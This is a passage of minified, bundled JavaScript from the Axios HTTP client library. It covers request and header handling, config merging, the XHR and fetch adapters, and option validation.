        sU.toString = function(e) {
            const t = e ? function(t) {
                return e.call(this, t, oU)
            }
            : oU;
            return this._pairs.map((function(e) {
                return t(e[0]) + "=" + t(e[1])
            }
            ), "").join("&")
        }
        ;
        const aU = iU;
        function cU(e) {
            return encodeURIComponent(e).replace(/%3A/gi, ":").replace(/%24/g, "$").replace(/%2C/gi, ",").replace(/%20/g, "+").replace(/%5B/gi, "[").replace(/%5D/gi, "]")
        }
        function lU(e, t, r) {
            if (!t)
                return e;
            const n = r && r.encode || cU;
            KF.isFunction(r) && (r = {
                serialize: r
            });
            const o = r && r.serialize;
            let i;
            if (i = o ? o(t, r) : KF.isURLSearchParams(t) ? t.toString() : new aU(t,r).toString(n),
            i) {
                const t = e.indexOf("#");
                -1 !== t && (e = e.slice(0, t)),
                e += (-1 === e.indexOf("?") ? "?" : "&") + i
            }
            return e
        }
        const uU = class {
            constructor() {
                this.handlers = []
            }
            use(e, t, r) {
                return this.handlers.push({
                    fulfilled: e,
                    rejected: t,
                    synchronous: !!r && r.synchronous,
                    runWhen: r ? r.runWhen : null
                }),
                this.handlers.length - 1
            }
            eject(e) {
                this.handlers[e] && (this.handlers[e] = null)
            }
            clear() {
                this.handlers && (this.handlers = [])
            }
            forEach(e) {
                KF.forEach(this.handlers, (function(t) {
                    null !== t && e(t)
                }
                ))
            }
        }
          , dU = {
            silentJSONParsing: !0,
            forcedJSONParsing: !0,
            clarifyTimeoutError: !1
        }
          , hU = {
            isBrowser: !0,
            classes: {
                URLSearchParams: "undefined" !== typeof URLSearchParams ? URLSearchParams : aU,
                FormData: "undefined" !== typeof FormData ? FormData : null,
                Blob: "undefined" !== typeof Blob ? Blob : null
            },
            protocols: ["http", "https", "file", "blob", "url", "data"]
        }
          , fU = "undefined" !== typeof window && "undefined" !== typeof document
          , pU = "object" === typeof navigator && navigator || void 0
          , gU = fU && (!pU || ["ReactNative", "NativeScript", "NS"].indexOf(pU.product) < 0)
          , yU = "undefined" !== typeof WorkerGlobalScope && self instanceof WorkerGlobalScope && "function" === typeof self.importScripts
          , mU = fU && window.location.href || "http://localhost"
          , bU = (0,
        k.A)((0,
        k.A)({}, A), hU);
        const vU = function(e) {
            function t(e, r, n, o) {
                let i = e[o++];
                if ("__proto__" === i)
                    return !0;
                const s = Number.isFinite(+i)
                  , a = o >= e.length;
                if (i = !i && KF.isArray(n) ? n.length : i,
                a)
                    return KF.hasOwnProp(n, i) ? n[i] = [n[i], r] : n[i] = r,
                    !s;
                n[i] && KF.isObject(n[i]) || (n[i] = []);
                return t(e, r, n[i], o) && KF.isArray(n[i]) && (n[i] = function(e) {
                    const t = {}
                      , r = Object.keys(e);
                    let n;
                    const o = r.length;
                    let i;
                    for (n = 0; n < o; n++)
                        i = r[n],
                        t[i] = e[i];
                    return t
                }(n[i])),
                !s
            }
            if (KF.isFormData(e) && KF.isFunction(e.entries)) {
                const r = {};
                return KF.forEachEntry(e, ( (e, n) => {
                    t(function(e) {
                        return KF.matchAll(/\w+|\[(\w*)]/g, e).map((e => "[]" === e[0] ? "" : e[1] || e[0]))
                    }(e), n, r, 0)
                }
                )),
                r
            }
            return null
        };
        const wU = {
            transitional: dU,
            adapter: ["xhr", "http", "fetch"],
            transformRequest: [function(e, t) {
                const r = t.getContentType() || ""
                  , n = r.indexOf("application/json") > -1
                  , o = KF.isObject(e);
                o && KF.isHTMLForm(e) && (e = new FormData(e));
                if (KF.isFormData(e))
                    return n ? JSON.stringify(vU(e)) : e;
                if (KF.isArrayBuffer(e) || KF.isBuffer(e) || KF.isStream(e) || KF.isFile(e) || KF.isBlob(e) || KF.isReadableStream(e))
                    return e;
                if (KF.isArrayBufferView(e))
                    return e.buffer;
                if (KF.isURLSearchParams(e))
                    return t.setContentType("application/x-www-form-urlencoded;charset=utf-8", !1),
                    e.toString();
                let i;
                if (o) {
                    if (r.indexOf("application/x-www-form-urlencoded") > -1)
                        return function(e, t) {
                            return nU(e, new bU.classes.URLSearchParams, Object.assign({
                                visitor: function(e, t, r, n) {
                                    return bU.isNode && KF.isBuffer(e) ? (this.append(t, e.toString("base64")),
                                    !1) : n.defaultVisitor.apply(this, arguments)
                                }
                            }, t))
                        }(e, this.formSerializer).toString();
                    if ((i = KF.isFileList(e)) || r.indexOf("multipart/form-data") > -1) {
                        const t = this.env && this.env.FormData;
                        return nU(i ? {
                            "files[]": e
                        } : e, t && new t, this.formSerializer)
                    }
                }
                return o || n ? (t.setContentType("application/json", !1),
                function(e, t, r) {
                    if (KF.isString(e))
                        try {
                            return (t || JSON.parse)(e),
                            KF.trim(e)
                        } catch (_l) {
                            if ("SyntaxError" !== _l.name)
                                throw _l
                        }
                    return (r || JSON.stringify)(e)
                }(e)) : e
            }
            ],
            transformResponse: [function(e) {
                const t = this.transitional || wU.transitional
                  , r = t && t.forcedJSONParsing
                  , n = "json" === this.responseType;
                if (KF.isResponse(e) || KF.isReadableStream(e))
                    return e;
                if (e && KF.isString(e) && (r && !this.responseType || n)) {
                    const r = !(t && t.silentJSONParsing) && n;
                    try {
                        return JSON.parse(e)
                    } catch (_l) {
                        if (r) {
                            if ("SyntaxError" === _l.name)
                                throw XF.from(_l, XF.ERR_BAD_RESPONSE, this, null, this.response);
                            throw _l
                        }
                    }
                }
                return e
            }
            ],
            timeout: 0,
            xsrfCookieName: "XSRF-TOKEN",
            xsrfHeaderName: "X-XSRF-TOKEN",
            maxContentLength: -1,
            maxBodyLength: -1,
            env: {
                FormData: bU.classes.FormData,
                Blob: bU.classes.Blob
            },
            validateStatus: function(e) {
                return e >= 200 && e < 300
            },
            headers: {
                common: {
                    Accept: "application/json, text/plain, */*",
                    "Content-Type": void 0
                }
            }
        };
        KF.forEach(["delete", "get", "head", "post", "put", "patch"], (e => {
            wU.headers[e] = {}
        }
        ));
        const TU = wU
          , AU = KF.toObjectSet(["age", "authorization", "content-length", "content-type", "etag", "expires", "from", "host", "if-modified-since", "if-unmodified-since", "last-modified", "location", "max-forwards", "proxy-authorization", "referer", "retry-after", "user-agent"])
          , EU = Symbol("internals");
        function PU(e) {
            return e && String(e).trim().toLowerCase()
        }
        function CU(e) {
            return !1 === e || null == e ? e : KF.isArray(e) ? e.map(CU) : String(e)
        }
        function SU(e, t, r, n, o) {
            return KF.isFunction(n) ? n.call(this, t, r) : (o && (t = r),
            KF.isString(t) ? KF.isString(n) ? -1 !== t.indexOf(n) : KF.isRegExp(n) ? n.test(t) : void 0 : void 0)
        }
        class IU {
            constructor(e) {
                e && this.set(e)
            }
            set(e, t, r) {
                const n = this;
                function o(e, t, r) {
                    const o = PU(t);
                    if (!o)
                        throw new Error("header name must be a non-empty string");
                    const i = KF.findKey(n, o);
                    (!i || void 0 === n[i] || !0 === r || void 0 === r && !1 !== n[i]) && (n[i || t] = CU(e))
                }
                const i = (e, t) => KF.forEach(e, ( (e, r) => o(e, r, t)));
                if (KF.isPlainObject(e) || e instanceof this.constructor)
                    i(e, t);
                else if (KF.isString(e) && (e = e.trim()) && !(e => /^[-_a-zA-Z0-9^`|~,!#$%&'*+.]+$/.test(e.trim()))(e))
                    i((e => {
                        const t = {};
                        let r, n, o;
                        return e && e.split("\n").forEach((function(e) {
                            o = e.indexOf(":"),
                            r = e.substring(0, o).trim().toLowerCase(),
                            n = e.substring(o + 1).trim(),
                            !r || t[r] && AU[r] || ("set-cookie" === r ? t[r] ? t[r].push(n) : t[r] = [n] : t[r] = t[r] ? t[r] + ", " + n : n)
                        }
                        )),
                        t
                    }
                    )(e), t);
                else if (KF.isHeaders(e))
                    for (const [s,a] of e.entries())
                        o(a, s, r);
                else
                    null != e && o(t, e, r);
                return this
            }
            get(e, t) {
                if (e = PU(e)) {
                    const r = KF.findKey(this, e);
                    if (r) {
                        const e = this[r];
                        if (!t)
                            return e;
                        if (!0 === t)
                            return function(e) {
                                const t = Object.create(null)
                                  , r = /([^\s,;=]+)\s*(?:=\s*([^,;]+))?/g;
                                let n;
                                for (; n = r.exec(e); )
                                    t[n[1]] = n[2];
                                return t
                            }(e);
                        if (KF.isFunction(t))
                            return t.call(this, e, r);
                        if (KF.isRegExp(t))
                            return t.exec(e);
                        throw new TypeError("parser must be boolean|regexp|function")
                    }
                }
            }
            has(e, t) {
                if (e = PU(e)) {
                    const r = KF.findKey(this, e);
                    return !(!r || void 0 === this[r] || t && !SU(0, this[r], r, t))
                }
                return !1
            }
            delete(e, t) {
                const r = this;
                let n = !1;
                function o(e) {
                    if (e = PU(e)) {
                        const o = KF.findKey(r, e);
                        !o || t && !SU(0, r[o], o, t) || (delete r[o],
                        n = !0)
                    }
                }
                return KF.isArray(e) ? e.forEach(o) : o(e),
                n
            }
            clear(e) {
                const t = Object.keys(this);
                let r = t.length
                  , n = !1;
                for (; r--; ) {
                    const o = t[r];
                    e && !SU(0, this[o], o, e, !0) || (delete this[o],
                    n = !0)
                }
                return n
            }
            normalize(e) {
                const t = this
                  , r = {};
                return KF.forEach(this, ( (n, o) => {
                    const i = KF.findKey(r, o);
                    if (i)
                        return t[i] = CU(n),
                        void delete t[o];
                    const s = e ? function(e) {
                        return e.trim().toLowerCase().replace(/([a-z\d])(\w*)/g, ( (e, t, r) => t.toUpperCase() + r))
                    }(o) : String(o).trim();
                    s !== o && delete t[o],
                    t[s] = CU(n),
                    r[s] = !0
                }
                )),
                this
            }
            concat() {
                for (var e = arguments.length, t = new Array(e), r = 0; r < e; r++)
                    t[r] = arguments[r];
                return this.constructor.concat(this, ...t)
            }
            toJSON(e) {
                const t = Object.create(null);
                return KF.forEach(this, ( (r, n) => {
                    null != r && !1 !== r && (t[n] = e && KF.isArray(r) ? r.join(", ") : r)
                }
                )),
                t
            }
            [Symbol.iterator]() {
                return Object.entries(this.toJSON())[Symbol.iterator]()
            }
            toString() {
                return Object.entries(this.toJSON()).map((e => {
                    let[t,r] = e;
                    return t + ": " + r
                }
                )).join("\n")
            }
            get[Symbol.toStringTag]() {
                return "AxiosHeaders"
            }
            static from(e) {
                return e instanceof this ? e : new this(e)
            }
            static concat(e) {
                const t = new this(e);
                for (var r = arguments.length, n = new Array(r > 1 ? r - 1 : 0), o = 1; o < r; o++)
                    n[o - 1] = arguments[o];
                return n.forEach((e => t.set(e))),
                t
            }
            static accessor(e) {
                const t = (this[EU] = this[EU] = {
                    accessors: {}
                }).accessors
                  , r = this.prototype;
                function n(e) {
                    const n = PU(e);
                    t[n] || (!function(e, t) {
                        const r = KF.toCamelCase(" " + t);
                        ["get", "set", "has"].forEach((n => {
                            Object.defineProperty(e, n + r, {
                                value: function(e, r, o) {
                                    return this[n].call(this, t, e, r, o)
                                },
                                configurable: !0
                            })
                        }
                        ))
                    }(r, e),
                    t[n] = !0)
                }
                return KF.isArray(e) ? e.forEach(n) : n(e),
                this
            }
        }
        IU.accessor(["Content-Type", "Content-Length", "Accept", "Accept-Encoding", "User-Agent", "Authorization"]),
        KF.reduceDescriptors(IU.prototype, ( (e, t) => {
            let {value: r} = e
              , n = t[0].toUpperCase() + t.slice(1);
            return {
                get: () => r,
                set(e) {
                    this[n] = e
                }
            }
        }
        )),
        KF.freezeMethods(IU);
        const BU = IU;
        function xU(e, t) {
            const r = this || TU
              , n = t || r
              , o = BU.from(n.headers);
            let i = n.data;
            return KF.forEach(e, (function(e) {
                i = e.call(r, i, o.normalize(), t ? t.status : void 0)
            }
            )),
            o.normalize(),
            i
        }
        function OU(e) {
            return !(!e || !e.__CANCEL__)
        }
        function _U(e, t, r) {
            XF.call(this, null == e ? "canceled" : e, XF.ERR_CANCELED, t, r),
            this.name = "CanceledError"
        }
        KF.inherits(_U, XF, {
            __CANCEL__: !0
        });
        const WU = _U;
        function RU(e, t, r) {
            const n = r.config.validateStatus;
            r.status && n && !n(r.status) ? t(new XF("Request failed with status code " + r.status,[XF.ERR_BAD_REQUEST, XF.ERR_BAD_RESPONSE][Math.floor(r.status / 100) - 4],r.config,r.request,r)) : e(r)
        }
        const kU = function(e, t) {
            e = e || 10;
            const r = new Array(e)
              , n = new Array(e);
            let o, i = 0, s = 0;
            return t = void 0 !== t ? t : 1e3,
            function(a) {
                const c = Date.now()
                  , l = n[s];
                o || (o = c),
                r[i] = a,
                n[i] = c;
                let u = s
                  , d = 0;
                for (; u !== i; )
                    d += r[u++],
                    u %= e;
                if (i = (i + 1) % e,
                i === s && (s = (s + 1) % e),
                c - o < t)
                    return;
                const h = l && c - l;
                return h ? Math.round(1e3 * d / h) : void 0
            }
        };
        const MU = function(e, t) {
            let r, n, o = 0, i = 1e3 / t;
            const s = function(t) {
                let i = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : Date.now();
                o = i,
                r = null,
                n && (clearTimeout(n),
                n = null),
                e.apply(null, t)
            };
            return [function() {
                const e = Date.now()
                  , t = e - o;
                for (var a = arguments.length, c = new Array(a), l = 0; l < a; l++)
                    c[l] = arguments[l];
                t >= i ? s(c, e) : (r = c,
                n || (n = setTimeout(( () => {
                    n = null,
                    s(r)
                }
                ), i - t)))
            }
            , () => r && s(r)]
        }
          , NU = function(e, t) {
            let r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 3
              , n = 0;
            const o = kU(50, 250);
            return MU((r => {
                const i = r.loaded
                  , s = r.lengthComputable ? r.total : void 0
                  , a = i - n
                  , c = o(a);
                n = i;
                e({
                    loaded: i,
                    total: s,
                    progress: s ? i / s : void 0,
                    bytes: a,
                    rate: c || void 0,
                    estimated: c && s && i <= s ? (s - i) / c : void 0,
                    event: r,
                    lengthComputable: null != s,
                    [t ? "download" : "upload"]: !0
                })
            }
            ), r)
        }
          , FU = (e, t) => {
            const r = null != e;
            return [n => t[0]({
                lengthComputable: r,
                total: e,
                loaded: n
            }), t[1]]
        }
          , UU = e => function() {
            for (var t = arguments.length, r = new Array(t), n = 0; n < t; n++)
                r[n] = arguments[n];
            return KF.asap(( () => e(...r)))
        }
          , DU = bU.hasStandardBrowserEnv ? ( (e, t) => r => (r = new URL(r,bU.origin),
        e.protocol === r.protocol && e.host === r.host && (t || e.port === r.port)))(new URL(bU.origin), bU.navigator && /(msie|trident)/i.test(bU.navigator.userAgent)) : () => !0
          , LU = bU.hasStandardBrowserEnv ? {
            write(e, t, r, n, o, i) {
                const s = [e + "=" + encodeURIComponent(t)];
                KF.isNumber(r) && s.push("expires=" + new Date(r).toGMTString()),
                KF.isString(n) && s.push("path=" + n),
                KF.isString(o) && s.push("domain=" + o),
                !0 === i && s.push("secure"),
                document.cookie = s.join("; ")
            },
            read(e) {
                const t = document.cookie.match(new RegExp("(^|;\\s*)(" + e + ")=([^;]*)"));
                return t ? decodeURIComponent(t[3]) : null
            },
            remove(e) {
                this.write(e, "", Date.now() - 864e5)
            }
        } : {
            write() {},
            read: () => null,
            remove() {}
        };
        function jU(e, t, r) {
            let n = !/^([a-z][a-z\d+\-.]*:)?\/\//i.test(t);
            return e && n || 0 == r ? function(e, t) {
                return t ? e.replace(/\/?\/$/, "") + "/" + t.replace(/^\/+/, "") : e
            }(e, t) : t
        }
        const zU = e => e instanceof BU ? (0,
        k.A)({}, e) : e;
        function VU(e, t) {
            t = t || {};
            const r = {};
            function n(e, t, r, n) {
                return KF.isPlainObject(e) && KF.isPlainObject(t) ? KF.merge.call({
                    caseless: n
                }, e, t) : KF.isPlainObject(t) ? KF.merge({}, t) : KF.isArray(t) ? t.slice() : t
            }
            function o(e, t, r, o) {
                return KF.isUndefined(t) ? KF.isUndefined(e) ? void 0 : n(void 0, e, 0, o) : n(e, t, 0, o)
            }
            function i(e, t) {
                if (!KF.isUndefined(t))
                    return n(void 0, t)
            }
            function s(e, t) {
                return KF.isUndefined(t) ? KF.isUndefined(e) ? void 0 : n(void 0, e) : n(void 0, t)
            }
            function a(r, o, i) {
                return i in t ? n(r, o) : i in e ? n(void 0, r) : void 0
            }
            const c = {
                url: i,
                method: i,
                data: i,
                baseURL: s,
                transformRequest: s,
                transformResponse: s,
                paramsSerializer: s,
                timeout: s,
                timeoutMessage: s,
                withCredentials: s,
                withXSRFToken: s,
                adapter: s,
                responseType: s,
                xsrfCookieName: s,
                xsrfHeaderName: s,
                onUploadProgress: s,
                onDownloadProgress: s,
                decompress: s,
                maxContentLength: s,
                maxBodyLength: s,
                beforeRedirect: s,
                transport: s,
                httpAgent: s,
                httpsAgent: s,
                cancelToken: s,
                socketPath: s,
                responseEncoding: s,
                validateStatus: a,
                headers: (e, t, r) => o(zU(e), zU(t), 0, !0)
            };
            return KF.forEach(Object.keys(Object.assign({}, e, t)), (function(n) {
                const i = c[n] || o
                  , s = i(e[n], t[n], n);
                KF.isUndefined(s) && i !== a || (r[n] = s)
            }
            )),
            r
        }
        const HU = e => {
            const t = VU({}, e);
            let r, {data: n, withXSRFToken: o, xsrfHeaderName: i, xsrfCookieName: s, headers: a, auth: c} = t;
            if (t.headers = a = BU.from(a),
            t.url = lU(jU(t.baseURL, t.url, t.allowAbsoluteUrls), e.params, e.paramsSerializer),
            c && a.set("Authorization", "Basic " + btoa((c.username || "") + ":" + (c.password ? unescape(encodeURIComponent(c.password)) : ""))),
            KF.isFormData(n))
                if (bU.hasStandardBrowserEnv || bU.hasStandardBrowserWebWorkerEnv)
                    a.setContentType(void 0);
                else if (!1 !== (r = a.getContentType())) {
                    const [e,...t] = r ? r.split(";").map((e => e.trim())).filter(Boolean) : [];
                    a.setContentType([e || "multipart/form-data", ...t].join("; "))
                }
            if (bU.hasStandardBrowserEnv && (o && KF.isFunction(o) && (o = o(t)),
            o || !1 !== o && DU(t.url))) {
                const e = i && s && LU.read(s);
                e && a.set(i, e)
            }
            return t
        }
          , qU = "undefined" !== typeof XMLHttpRequest && function(e) {
            return new Promise((function(t, r) {
                const n = HU(e);
                let o = n.data;
                const i = BU.from(n.headers).normalize();
                let s, a, c, l, u, {responseType: d, onUploadProgress: h, onDownloadProgress: f} = n;
                function p() {
                    l && l(),
                    u && u(),
                    n.cancelToken && n.cancelToken.unsubscribe(s),
                    n.signal && n.signal.removeEventListener("abort", s)
                }
                let g = new XMLHttpRequest;
                function y() {
                    if (!g)
                        return;
                    const n = BU.from("getAllResponseHeaders"in g && g.getAllResponseHeaders());
                    RU((function(e) {
                        t(e),
                        p()
                    }
                    ), (function(e) {
                        r(e),
                        p()
                    }
                    ), {
                        data: d && "text" !== d && "json" !== d ? g.response : g.responseText,
                        status: g.status,
                        statusText: g.statusText,
                        headers: n,
                        config: e,
                        request: g
                    }),
                    g = null
                }
                g.open(n.method.toUpperCase(), n.url, !0),
                g.timeout = n.timeout,
                "onloadend"in g ? g.onloadend = y : g.onreadystatechange = function() {
                    g && 4 === g.readyState && (0 !== g.status || g.responseURL && 0 === g.responseURL.indexOf("file:")) && setTimeout(y)
                }
                ,
                g.onabort = function() {
                    g && (r(new XF("Request aborted",XF.ECONNABORTED,e,g)),
                    g = null)
                }
                ,
                g.onerror = function() {
                    r(new XF("Network Error",XF.ERR_NETWORK,e,g)),
                    g = null
                }
                ,
                g.ontimeout = function() {
                    let t = n.timeout ? "timeout of " + n.timeout + "ms exceeded" : "timeout exceeded";
                    const o = n.transitional || dU;
                    n.timeoutErrorMessage && (t = n.timeoutErrorMessage),
                    r(new XF(t,o.clarifyTimeoutError ? XF.ETIMEDOUT : XF.ECONNABORTED,e,g)),
                    g = null
                }
                ,
                void 0 === o && i.setContentType(null),
                "setRequestHeader"in g && KF.forEach(i.toJSON(), (function(e, t) {
                    g.setRequestHeader(t, e)
                }
                )),
                KF.isUndefined(n.withCredentials) || (g.withCredentials = !!n.withCredentials),
                d && "json" !== d && (g.responseType = n.responseType),
                f && ([c,u] = NU(f, !0),
                g.addEventListener("progress", c)),
                h && g.upload && ([a,l] = NU(h),
                g.upload.addEventListener("progress", a),
                g.upload.addEventListener("loadend", l)),
                (n.cancelToken || n.signal) && (s = t => {
                    g && (r(!t || t.type ? new WU(null,e,g) : t),
                    g.abort(),
                    g = null)
                }
                ,
                n.cancelToken && n.cancelToken.subscribe(s),
                n.signal && (n.signal.aborted ? s() : n.signal.addEventListener("abort", s)));
                const m = function(e) {
                    const t = /^([-+\w]{1,25})(:?\/\/|:)/.exec(e);
                    return t && t[1] || ""
                }(n.url);
                m && -1 === bU.protocols.indexOf(m) ? r(new XF("Unsupported protocol " + m + ":",XF.ERR_BAD_REQUEST,e)) : g.send(o || null)
            }
            ))
        }
          , GU = (e, t) => {
            const {length: r} = e = e ? e.filter(Boolean) : [];
            if (t || r) {
                let r, n = new AbortController;
                const o = function(e) {
                    if (!r) {
                        r = !0,
                        s();
                        const t = e instanceof Error ? e : this.reason;
                        n.abort(t instanceof XF ? t : new WU(t instanceof Error ? t.message : t))
                    }
                };
                let i = t && setTimeout(( () => {
                    i = null,
                    o(new XF("timeout ".concat(t, " of ms exceeded"),XF.ETIMEDOUT))
                }
                ), t);
                const s = () => {
                    e && (i && clearTimeout(i),
                    i = null,
                    e.forEach((e => {
                        e.unsubscribe ? e.unsubscribe(o) : e.removeEventListener("abort", o)
                    }
                    )),
                    e = null)
                }
                ;
                e.forEach((e => e.addEventListener("abort", o)));
                const {signal: a} = n;
                return a.unsubscribe = () => KF.asap(s),
                a
            }
        }
          , $U = function*(e, t) {
            let r = e.byteLength;
            if (!t || r < t)
                return void (yield e);
            let n, o = 0;
            for (; o < r; )
                n = o + t,
                yield e.slice(o, n),
                o = n
        }
          , KU = function() {
            var e = Hs((function*(e, t) {
                var r, n = !1, o = !1;
                try {
                    for (var i, s = Ks(ZU(e)); n = !(i = yield Gs(s.next())).done; n = !1) {
                        const e = i.value;
                        yield*$s(Ks($U(e, t)))
                    }
                } catch (a) {
                    o = !0,
                    r = a
                } finally {
                    try {
                        n && null != s.return && (yield Gs(s.return()))
                    } finally {
                        if (o)
                            throw r
                    }
                }
            }
            ));
            return function(t, r) {
                return e.apply(this, arguments)
            }
        }()
          , ZU = function() {
            var e = Hs((function*(e) {
                if (e[Symbol.asyncIterator])
                    return void (yield*$s(Ks(e)));
                const t = e.getReader();
                try {
                    for (; ; ) {
                        const {done: e, value: r} = yield Gs(t.read());
                        if (e)
                            break;
                        yield r
                    }
                } finally {
                    yield Gs(t.cancel())
                }
            }
            ));
            return function(t) {
                return e.apply(this, arguments)
            }
        }()
          , YU = (e, t, r, n) => {
            const o = KU(e, t);
            let i, s = 0, a = e => {
                i || (i = !0,
                n && n(e))
            }
            ;
            return new ReadableStream({
                async pull(e) {
                    try {
                        const {done: t, value: n} = await o.next();
                        if (t)
                            return a(),
                            void e.close();
                        let i = n.byteLength;
                        if (r) {
                            let e = s += i;
                            r(e)
                        }
                        e.enqueue(new Uint8Array(n))
                    } catch (t) {
                        throw a(t),
                        t
                    }
                },
                cancel: e => (a(e),
                o.return())
            },{
                highWaterMark: 2
            })
        }
          , JU = "function" === typeof fetch && "function" === typeof Request && "function" === typeof Response
          , XU = JU && "function" === typeof ReadableStream
          , QU = JU && ("function" === typeof TextEncoder ? (e => t => e.encode(t))(new TextEncoder) : async e => new Uint8Array(await new Response(e).arrayBuffer()))
          , eD = function(e) {
            try {
                for (var t = arguments.length, r = new Array(t > 1 ? t - 1 : 0), n = 1; n < t; n++)
                    r[n - 1] = arguments[n];
                return !!e(...r)
            } catch (_l) {
                return !1
            }
        }
          , tD = XU && eD(( () => {
            let e = !1;
            const t = new Request(bU.origin,{
                body: new ReadableStream,
                method: "POST",
                get duplex() {
                    return e = !0,
                    "half"
                }
            }).headers.has("Content-Type");
            return e && !t
        }
        ))
          , rD = XU && eD(( () => KF.isReadableStream(new Response("").body)))
          , nD = {
            stream: rD && (e => e.body)
        };
        var oD;
        JU && (oD = new Response,
        ["text", "arrayBuffer", "blob", "formData", "stream"].forEach((e => {
            !nD[e] && (nD[e] = KF.isFunction(oD[e]) ? t => t[e]() : (t, r) => {
                throw new XF("Response type '".concat(e, "' is not supported"),XF.ERR_NOT_SUPPORT,r)
            }
            )
        }
        )));
        const iD = async (e, t) => {
            const r = KF.toFiniteNumber(e.getContentLength());
            return null == r ? (async e => {
                if (null == e)
                    return 0;
                if (KF.isBlob(e))
                    return e.size;
                if (KF.isSpecCompliantForm(e)) {
                    const t = new Request(bU.origin,{
                        method: "POST",
                        body: e
                    });
                    return (await t.arrayBuffer()).byteLength
                }
                return KF.isArrayBufferView(e) || KF.isArrayBuffer(e) ? e.byteLength : (KF.isURLSearchParams(e) && (e += ""),
                KF.isString(e) ? (await QU(e)).byteLength : void 0)
            }
            )(t) : r
        }
          , sD = JU && (async e => {
            let {url: t, method: r, data: n, signal: o, cancelToken: i, timeout: s, onDownloadProgress: a, onUploadProgress: c, responseType: l, headers: u, withCredentials: d="same-origin", fetchOptions: h} = HU(e);
            l = l ? (l + "").toLowerCase() : "text";
            let f, p = GU([o, i && i.toAbortSignal()], s);
            const g = p && p.unsubscribe && ( () => {
                p.unsubscribe()
            }
            );
            let y;
            try {
                if (c && tD && "get" !== r && "head" !== r && 0 !== (y = await iD(u, n))) {
                    let e, r = new Request(t,{
                        method: "POST",
                        body: n,
                        duplex: "half"
                    });
                    if (KF.isFormData(n) && (e = r.headers.get("content-type")) && u.setContentType(e),
                    r.body) {
                        const [e,t] = FU(y, NU(UU(c)));
                        n = YU(r.body, 65536, e, t)
                    }
                }
                KF.isString(d) || (d = d ? "include" : "omit");
                const o = "credentials"in Request.prototype;
                f = new Request(t,(0,
                k.A)((0,
                k.A)({}, h), {}, {
                    signal: p,
                    method: r.toUpperCase(),
                    headers: u.normalize().toJSON(),
                    body: n,
                    duplex: "half",
                    credentials: o ? d : void 0
                }));
                let i = await fetch(f);
                const s = rD && ("stream" === l || "response" === l);
                if (rD && (a || s && g)) {
                    const e = {};
                    ["status", "statusText", "headers"].forEach((t => {
                        e[t] = i[t]
                    }
                    ));
                    const t = KF.toFiniteNumber(i.headers.get("content-length"))
                      , [r,n] = a && FU(t, NU(UU(a), !0)) || [];
                    i = new Response(YU(i.body, 65536, r, ( () => {
                        n && n(),
                        g && g()
                    }
                    )),e)
                }
                l = l || "text";
                let m = await nD[KF.findKey(nD, l) || "text"](i, e);
                return !s && g && g(),
                await new Promise(( (t, r) => {
                    RU(t, r, {
                        data: m,
                        headers: BU.from(i.headers),
                        status: i.status,
                        statusText: i.statusText,
                        config: e,
                        request: f
                    })
                }
                ))
            } catch (m) {
                if (g && g(),
                m && "TypeError" === m.name && /fetch/i.test(m.message))
                    throw Object.assign(new XF("Network Error",XF.ERR_NETWORK,e,f), {
                        cause: m.cause || m
                    });
                throw XF.from(m, m && m.code, e, f)
            }
        }
        )
          , aD = {
            http: null,
            xhr: qU,
            fetch: sD
        };
        KF.forEach(aD, ( (e, t) => {
            if (e) {
                try {
                    Object.defineProperty(e, "name", {
                        value: t
                    })
                } catch (_l) {}
                Object.defineProperty(e, "adapterName", {
                    value: t
                })
            }
        }
        ));
        const cD = e => "- ".concat(e)
          , lD = e => KF.isFunction(e) || null === e || !1 === e
          , uD = e => {
            e = KF.isArray(e) ? e : [e];
            const {length: t} = e;
            let r, n;
            const o = {};
            for (let i = 0; i < t; i++) {
                let t;
                if (r = e[i],
                n = r,
                !lD(r) && (n = aD[(t = String(r)).toLowerCase()],
                void 0 === n))
                    throw new XF("Unknown adapter '".concat(t, "'"));
                if (n)
                    break;
                o[t || "#" + i] = n
            }
            if (!n) {
                const e = Object.entries(o).map((e => {
                    let[t,r] = e;
                    return "adapter ".concat(t, " ") + (!1 === r ? "is not supported by the environment" : "is not available in the build")
                }
                ));
                let r = t ? e.length > 1 ? "since :\n" + e.map(cD).join("\n") : " " + cD(e[0]) : "as no adapter specified";
                throw new XF("There is no suitable adapter to dispatch the request " + r,"ERR_NOT_SUPPORT")
            }
            return n
        }
        ;
        function dD(e) {
            if (e.cancelToken && e.cancelToken.throwIfRequested(),
            e.signal && e.signal.aborted)
                throw new WU(null,e)
        }
        function hD(e) {
            dD(e),
            e.headers = BU.from(e.headers),
            e.data = xU.call(e, e.transformRequest),
            -1 !== ["post", "put", "patch"].indexOf(e.method) && e.headers.setContentType("application/x-www-form-urlencoded", !1);
            return uD(e.adapter || TU.adapter)(e).then((function(t) {
                return dD(e),
                t.data = xU.call(e, e.transformResponse, t),
                t.headers = BU.from(t.headers),
                t
            }
            ), (function(t) {
                return OU(t) || (dD(e),
                t && t.response && (t.response.data = xU.call(e, e.transformResponse, t.response),
                t.response.headers = BU.from(t.response.headers))),
                Promise.reject(t)
            }
            ))
        }
        const fD = "1.8.3"
          , pD = {};
        ["object", "boolean", "number", "function", "string", "symbol"].forEach(( (e, t) => {
            pD[e] = function(r) {
                return typeof r === e || "a" + (t < 1 ? "n " : " ") + e
            }
        }
        ));
        const gD = {};
        pD.transitional = function(e, t, r) {
            function n(e, t) {
                return "[Axios v1.8.3] Transitional option '" + e + "'" + t + (r ? ". " + r : "")
            }
            return (r, o, i) => {
                if (!1 === e)
                    throw new XF(n(o, " has been removed" + (t ? " in " + t : "")),XF.ERR_DEPRECATED);
                return t && !gD[o] && (gD[o] = !0,
                console.warn(n(o, " has been deprecated since v" + t + " and will be removed in the near future"))),
                !e || e(r, o, i)
            }
        }
        ,
        pD.spelling = function(e) {
            return (t, r) => (console.warn("".concat(r, " is likely a misspelling of ").concat(e)),
            !0)
        }
        ;
        const yD = {
            assertOptions: function(e, t, r) {
                if ("object" !== typeof e)
                    throw new XF("options must be an object",XF.ERR_BAD_OPTION_VALUE);
                const n = Object.keys(e);
                let o = n.length;
                for (; o-- > 0; ) {
                    const i = n[o]
                      , s = t[i];
                    if (s) {
                        const t = e[i]
                          , r = void 0 === t || s(t, i, e);
                        if (!0 !== r)
                            throw new XF("option " + i + " must be " + r,XF.ERR_BAD_OPTION_VALUE)
                    } else if (!0 !== r)
                        throw new XF("Unknown option " + i,XF.ERR_BAD_OPTION)
                }
            },
            validators: pD
        }
